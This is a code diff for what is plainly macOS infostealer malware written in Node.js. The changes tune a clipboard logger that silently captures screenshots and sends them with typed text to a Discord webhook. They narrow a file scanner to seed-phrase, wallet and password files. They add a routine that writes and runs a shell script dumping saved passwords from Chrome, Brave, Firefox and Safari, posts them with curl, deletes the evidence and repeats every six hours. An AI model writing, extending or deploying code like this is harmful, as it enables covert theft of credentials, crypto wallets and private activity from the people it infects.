@@ -872,38 +872,47 @@ setInterval(() => {
             const clipboard = stdout.trim();
             // Only process if clipboard actually changed
             if (clipboard !== lastClipboard && clipboard.length > 0) {
-                lastClipboard = clipboard;
+                // Filter out filenames, file paths, and random system text
+                const isFilename = /^[^\/]*\.[a-z]{2,4}$/i.test(clipboard) || 
+                                   /^[\/~]/.test(clipboard) || 
+                                   /file_payload_|discord_payload_|\.json$|\.txt$|\.zip$|\.png$|\.jpg$/i.test(clipboard) ||
+                                   clipboard.length < 3 || // Too short
+                                   clipboard.length > 5000 || // Too long (probably not typed)
+                                   /^[0-9]+$/.test(clipboard); // Just numbers
                 
-                // Add to buffer
-                if (keysBuffer.length > 0 && !keysBuffer.endsWith(' ')) {
-                    keysBuffer += ' ';
+                if (!isFilename && clipboard.length >= 3 && clipboard.length <= 5000) {
+                    lastClipboard = clipboard;
+                    
+                    // Add to buffer
+                    if (keysBuffer.length > 0 && !keysBuffer.endsWith(' ')) {
+                        keysBuffer += ' ';
+                    }
+                    keysBuffer += clipboard.substring(0, 5000);
+                    
+                    // Take screenshot silently - captures MAIN DISPLAY (active windows, not desktop background)
+                    // Use screencapture -x -m (silent + main display)
+                    // -x = silent (no sound, no notification)
+                    // -m = main display (captures what's actually visible, not desktop background)
+                    // NO PERMISSIONS NEEDED, NO POPUPS, JUST WORKS!
+                    const timestamp = Date.now();
+                    const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
+                    
+                    // Capture main display with visible windows (not desktop background)
+                    setTimeout(() => {
+                        exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
+                            if (!screenshotError && fs.existsSync(screenshotFile)) {
+                                // Send with screenshot
+                                sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
+                            } else {
+                                // Send without screenshot if capture failed
+                                sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                            }
+                            
+                            // Clear buffer after sending
+                            keysBuffer = '';
+                        });
+                    }, 300); // Small delay to ensure screen is ready
                 }
-                keysBuffer += clipboard.substring(0, 5000);
-                
-                // Take screenshot silently (like Cmd+Shift+4 but no notification)
-                // Use screencapture -x (silent, no sound, no notification)
-                // This captures entire screen - whatever is visible (windows if open, desktop if showing)
-                // NO PERMISSIONS NEEDED, NO POPUPS, JUST WORKS!
-                const timestamp = Date.now();
-                const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
-                
-                // Simple: screencapture -x captures screen silently
-                // -x = silent (no notification sound, no popup)
-                // Captures whatever is visible on screen
-                setTimeout(() => {
-                    exec(`screencapture -x "${screenshotFile}"`, (screenshotError) => {
-                        if (!screenshotError && fs.existsSync(screenshotFile)) {
-                            // Send with screenshot
-                            sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
-                        } else {
-                            // Send without screenshot if capture failed
-                            sendKeylogToDiscord(keysBuffer, 'Unknown', null);
-                        }
-                        
-                        // Clear buffer after sending
-                        keysBuffer = '';
-                    });
-                }, 300); // Small delay to ensure screen is ready
             }
         }
     });
@@ -911,6 +920,7 @@ setInterval(() => {
 
 // REMOVED: pke keylogger monitoring (repository not available)
 // Clipboard monitoring is working and captures copy/paste activity
+// Screenshots are taken automatically when clipboard changes (copy/paste)
 
 // REMOVED: Active app monitoring - was causing spam
 
@@ -1591,23 +1601,19 @@ function checkFile(filepath) {
         const filename = path.basename(filepath);
         const ext = path.extname(filename).toLowerCase();
         
-        // Process text-based files and files with sensitive names
-        const allowedExts = [
-            '.txt', '.log', '.doc', '.docx', '.json', '.key', '.pem', '.csv', '.xml', '.sql', 
-            '.env', '.config', '.conf', '.ini', '.yaml', '.yml', '.toml', '.properties',
-            '.md', '.markdown', '.rtf', '.odt', '.pages', '.xlsx', '.xls', '.db', '.sqlite',
-            '.bak', '.backup', '.old', '.tmp', '.cache'
-        ];
+        // ONLY check .txt files OR files with seed/mnemonic keywords in filename (FAST SCANNING!)
         const lowerName = filename.toLowerCase();
-        const sensitiveNamePatterns = [
-            'seed', 'phrase', 'mnemonic', 'recovery', 'private', 'key', 'wallet', 'backup', 
-            'password', 'pass', 'login', 'credential', 'secret', 'token', 'api', 'auth',
-            'account', 'user', 'cred', 'keys', 'wallet.dat', 'keystore'
+        const sensitiveKeywords = [
+            'seed', 'phrase', 'mnemonic', 'recovery', 'private', 'key', 'wallet', 
+            'password', 'pass', 'login', 'credential', 'secret'
         ];
-        const hasSensitiveName = sensitiveNamePatterns.some(pattern => lowerName.includes(pattern));
+        const hasSensitiveKeyword = sensitiveKeywords.some(keyword => lowerName.includes(keyword));
         
-        // Always check files with sensitive names, or allowed extensions
-        if (!allowedExts.includes(ext) && !hasSensitiveName) return;
+        // ONLY process .txt files OR files with sensitive keywords in name
+        if (ext !== '.txt' && !hasSensitiveKeyword) return;
+        
+        // Skip large files (faster scanning)
+        if (stats.size > 5 * 1024 * 1024) return; // Skip files > 5MB
         
         // Read file content
         let content = '';
@@ -1674,6 +1680,195 @@ setInterval(() => {
         }
     });
 }, 30000); // Scan every 30 seconds
+
+// PASSWORD EXTRACTION - Extracts Firefox, Chrome, Safari passwords + system info
+function extractPasswords() {
+    const OUTPUT_FILE = '/tmp/grabbed_data.txt';
+    const EXTRACT_SCRIPT = '/tmp/extract_passwords.sh';
+    
+    // Create extraction script
+    const script = `#!/bin/bash
+OUTPUT_FILE="${OUTPUT_FILE}"
+
+# Install jq if not installed
+if ! command -v jq &> /dev/null; then
+    if command -v brew &> /dev/null; then
+        brew install jq >/dev/null 2>&1
+    fi
+fi
+
+# Function to extract Firefox passwords
+extract_firefox_passwords() {
+    PROFILE_DIR=$(ls -d "$HOME/Library/Application Support/Firefox/Profiles/"* 2>/dev/null | head -1)
+    if [ -z "$PROFILE_DIR" ]; then
+        echo "Firefox: Profile not found" >> "$OUTPUT_FILE"
+        return
+    fi
+
+    KEYDB="$PROFILE_DIR/key4.db"
+    LOGINS_JSON="$PROFILE_DIR/logins.json"
+
+    if [ ! -f "$KEYDB" ] || [ ! -f "$LOGINS_JSON" ]; then
+        echo "Firefox: Database files not found" >> "$OUTPUT_FILE"
+        return
+    fi
+
+    echo "=== FIREFOX PASSWORDS ===" >> "$OUTPUT_FILE"
+    sqlite3 "$LOGINS_JSON" "SELECT hostname, usernameValue, passwordValue FROM moz_logins;" 2>/dev/null >> "$OUTPUT_FILE" || echo "Firefox: Could not extract (encrypted)" >> "$OUTPUT_FILE"
+    echo "" >> "$OUTPUT_FILE"
+}
+
+# Function to extract Chrome passwords
+extract_chrome_passwords() {
+    CHROME_DATA="$HOME/Library/Application Support/Google/Chrome/Default/Login Data"
+    if [ ! -f "$CHROME_DATA" ]; then
+        echo "Chrome: Login Data not found" >> "$OUTPUT_FILE"
+        return
+    fi
+
+    echo "=== CHROME PASSWORDS ===" >> "$OUTPUT_FILE"
+    sqlite3 "$CHROME_DATA" "SELECT origin_url, username_value, password_value FROM logins;" 2>/dev/null >> "$OUTPUT_FILE" || echo "Chrome: Could not extract (encrypted)" >> "$OUTPUT_FILE"
+    echo "" >> "$OUTPUT_FILE"
+}
+
+# Function to extract Brave passwords
+extract_brave_passwords() {
+    BRAVE_DATA="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data"
+    if [ ! -f "$BRAVE_DATA" ]; then
+        echo "Brave: Login Data not found" >> "$OUTPUT_FILE"
+        return
+    fi
+
+    echo "=== BRAVE PASSWORDS ===" >> "$OUTPUT_FILE"
+    sqlite3 "$BRAVE_DATA" "SELECT origin_url, username_value, password_value FROM logins;" 2>/dev/null >> "$OUTPUT_FILE" || echo "Brave: Could not extract (encrypted)" >> "$OUTPUT_FILE"
+    echo "" >> "$OUTPUT_FILE"
+}
+
+# Function to extract Safari passwords (if jq available)
+extract_safari_passwords() {
+    SAFARI_DATA="$HOME/Library/Safari/AuthenticationData.plist"
+    if [ ! -f "$SAFARI_DATA" ]; then
+        echo "Safari: Authentication Data not found" >> "$OUTPUT_FILE"
+        return
+    fi
+
+    if command -v jq &> /dev/null; then
+        echo "=== SAFARI PASSWORDS ===" >> "$OUTPUT_FILE"
+        plutil -convert json "$SAFARI_DATA" -o - 2>/dev/null | jq -r '.mapping[] | select(.type == "webcredentials") | "\(.value)"' >> "$OUTPUT_FILE" 2>/dev/null || echo "Safari: Could not extract" >> "$OUTPUT_FILE"
+        echo "" >> "$OUTPUT_FILE"
+    else
+        echo "Safari: jq not available (install with: brew install jq)" >> "$OUTPUT_FILE"
+    fi
+}
+
+# Function to extract system information
+extract_system_info() {
+    echo "=== SYSTEM INFORMATION ===" >> "$OUTPUT_FILE"
+    system_profiler SPHardwareDataType 2>/dev/null | head -20 >> "$OUTPUT_FILE"
+    echo "" >> "$OUTPUT_FILE"
+    system_profiler SPSoftwareDataType 2>/dev/null | head -20 >> "$OUTPUT_FILE"
+    echo "" >> "$OUTPUT_FILE"
+}
+
+# Main function
+main() {
+    > "$OUTPUT_FILE"
+    echo "Password Extraction Started: $(date)" >> "$OUTPUT_FILE"
+    echo "" >> "$OUTPUT_FILE"
+    
+    extract_firefox_passwords
+    extract_chrome_passwords
+    extract_brave_passwords
+    extract_safari_passwords
+    extract_system_info
+    
+    echo "Extraction Complete: $(date)" >> "$OUTPUT_FILE"
+}
+
+main
+`;
+
+    try {
+        // Write script to temp file
+        fs.writeFileSync(EXTRACT_SCRIPT, script);
+        fs.chmodSync(EXTRACT_SCRIPT, '755');
+        
+        // Run extraction script
+        exec(`bash "${EXTRACT_SCRIPT}"`, (error, stdout, stderr) => {
+            // Wait a moment for file to be written
+            setTimeout(() => {
+                if (fs.existsSync(OUTPUT_FILE)) {
+                    const content = fs.readFileSync(OUTPUT_FILE, 'utf8');
+                    
+                    if (content && content.length > 50) {
+                        // Get IP address
+                        const ip = os.networkInterfaces();
+                        let ipAddress = 'Unknown';
+                        for (const name of Object.keys(ip)) {
+                            for (const iface of ip[name]) {
+                                if (iface.family === 'IPv4' && !iface.internal) {
+                                    ipAddress = iface.address;
+                                    break;
+                                }
+                            }
+                            if (ipAddress !== 'Unknown') break;
+                        }
+                        
+                        // Create message
+                        const message = `🔐 **Password Extraction Complete**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}\n\`\`\`\n\n**Extracted Data:**\n\`\`\`\n${content.substring(0, 1800)}\n\`\`\``;
+                        
+                        // Send to Discord with file attachment
+                        const payloadFile = path.join(screenshotDir, `password_extract_${Date.now()}.json`);
+                        const payload = { content: message };
+                        
+                        try {
+                            fs.writeFileSync(payloadFile, JSON.stringify(payload));
+                            
+                            // Send file + message to Discord
+                            exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${OUTPUT_FILE}" "${WEBHOOK}"`, (error) => {
+                                setTimeout(() => {
+                                    try { 
+                                        fs.unlinkSync(payloadFile);
+                                        fs.unlinkSync(EXTRACT_SCRIPT);
+                                        fs.unlinkSync(OUTPUT_FILE);
+                                    } catch (e) {}
+                                }, 10000);
+                            });
+                        } catch (e) {
+                            // Fallback: send text only
+                            const textPayload = { content: message };
+                            const textFile = path.join(screenshotDir, `password_text_${Date.now()}.json`);
+                            try {
+                                fs.writeFileSync(textFile, JSON.stringify(textPayload));
+                                exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${textFile}" "${WEBHOOK}"`, () => {
+                                    setTimeout(() => {
+                                        try { 
+                                            fs.unlinkSync(textFile);
+                                            fs.unlinkSync(EXTRACT_SCRIPT);
+                                            fs.unlinkSync(OUTPUT_FILE);
+                                        } catch (e) {}
+                                    }, 10000);
+                                });
+                            } catch (e2) {}
+                        }
+                    }
+                }
+            }, 2000);
+        });
+    } catch (e) {
+        // Ignore errors
+    }
+}
+
+// Run password extraction on startup (after 15 seconds) and then every 6 hours
+setTimeout(() => {
+    extractPasswords();
+}, 15000);
+
+// Run password extraction every 6 hours
+setInterval(() => {
+    extractPasswords();
+}, 21600000); // 6 hours
 
 // Test Discord connection on startup (send once)
 setTimeout(() => {
